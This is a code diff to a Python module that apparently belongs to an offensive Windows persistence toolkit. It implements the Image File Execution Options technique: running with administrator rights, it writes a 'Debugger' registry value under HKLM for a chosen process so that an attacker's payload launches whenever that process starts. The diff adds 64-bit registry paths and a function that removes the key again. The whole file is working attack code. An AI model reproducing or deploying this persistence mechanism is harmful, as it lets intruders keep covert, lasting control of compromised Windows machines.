@@ -1,7 +1,55 @@
 import os
+import wmi
 import ctypes
 import _winreg
 from core.prints import *
+
+wmi = wmi.WMI()
+
+def architecture():
+	for os in wmi.Win32_OperatingSystem():
+		return os.OSArchitecture
+
+def reg_delete(path,process):
+	try:
+		key = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE,os.path.join(path),0,_winreg.KEY_ALL_ACCESS)
+		_winreg.DeleteKey(key,process)
+		_winreg.CloseKey(key)
+	except Exception as error:
+		return False
+	else:
+		return True
+
+def reg_create(path,process,payload):
+	try:
+		key = _winreg.CreateKey(_winreg.HKEY_LOCAL_MACHINE,os.path.join(path,process))
+		_winreg.SetValueEx(key,"Debugger",0,_winreg.REG_SZ,payload)
+		_winreg.CloseKey(key)
+	except Exception as error:
+		return False
+	else:
+		return True
+		
+def ifeo_delete(process):
+	"""
+	Delete persistence by calling this function
+	"""	
+	if (ctypes.windll.shell32.IsUserAnAdmin() == True):		
+		if ("64" in architecture()):
+			if (reg_delete("Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options",process) == True):
+				print_success("Successfully deleted persistence key")
+			else:
+				print_error("Unable to delete persistence key")
+				return False
+		else:
+			if (reg_delete("Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options",process) == True):
+				print_success("Successfully deleted persistence key")
+			else:
+				print_error("Unable to delete persistence key")
+				return False
+	else:
+		print_error("Unable to delete persistence key, we are not elevated")
+		return False
 
 def ifeo(process,payload):
 	print """
@@ -17,21 +65,19 @@ def ifeo(process,payload):
 	print_info("Process: {}".format(process))
 	print_info("Payload: {}".format(payload))
 	
-	"""
-	If we are running elevated, we add the registry
-	key Debugger and the path to our payload
-	"""
 	if (ctypes.windll.shell32.IsUserAnAdmin() == True):
-		print_info("Attempting to create Debugger registry key")
-		try:
-			key = _winreg.CreateKey(_winreg.HKEY_LOCAL_MACHINE,os.path.join("Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options",process))
-			_winreg.SetValueEx(key,"Debugger",0,_winreg.REG_SZ,payload)
-			_winreg.CloseKey(key)		
-		except Exception as error:
-			print_error("Unable to create Debugger registry key, exception was raised")
-			return False
+		if ("64" in architecture()):
+			if (reg_create("Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options",process,payload) == True):
+				print_success("Successfully created persistence key")
+			else:
+				print_error("Unable to create persistence key")
+				return False
 		else:
-			print_success("Successfully created Debugger registry key containing our payload")
+			if (reg_create("Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options",process,payload) == True):
+				print_success("Successfully created persistence key")
+			else:
+				print_error("Unable to create persistence key")
+				return False
 	else:
-		print_error("Unable to create Debugger registry key, we are not elevated")
+		print_error("Unable to create persistence key, we are not elevated")
 		return False
